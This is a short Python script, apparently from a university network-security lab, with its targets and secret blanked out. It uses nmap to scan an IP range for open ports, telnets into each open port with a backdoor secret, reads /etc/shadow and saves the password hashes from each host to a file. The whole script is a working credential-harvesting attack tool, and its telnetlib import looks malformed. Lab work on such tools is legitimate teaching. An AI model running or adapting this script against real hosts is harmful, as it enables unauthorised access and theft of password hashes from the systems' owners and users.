################
# Written by Kyle Koza
# for the ECE 6612 NetSec Lab
# and sanitized for GitHub
################

import xml.etree.ElementTree as ElementTree
from telnetlib import telnetlib
import nmap

iprange = 
ports = 
secret = 

nm = nmap.PortScanner()
nm.scan(iprange, ports, "-sS")

#tree = ElementTree.parse('backdoor.xml')
tree = ElementTree.fromstring(nm.get_nmap_last_output())
ElementTree.ElementTree(tree).write('backdoor.xml')

for host in tree.iter('host'):
	hostid = host.find('address').attrib['addr']
	print("Examining host " + hostid)
	for port in host.iter('port'):
		portid = port.attrib['portid']
		print("\tExamining port " + portid)
		state = port.find('state')
		if (state.attrib['state'] == "open"):
			print("\t\tPort OPEN!")
			# Telnet and grab shadow file
			print("\t\tConnecting...")
			tn = telnetlib.Telnet(hostid, portid)
			tn.write(secret + "\n")
			tn.write("cat /etc/shadow" + "\n")
			fo = open(hostid + ".shadow", "w")
			out = tn.read_until("doneddddd",10)
			tn.close()
			print(out)
			fo.write(out)
			break
		else:
			print("\t\tPort closed")
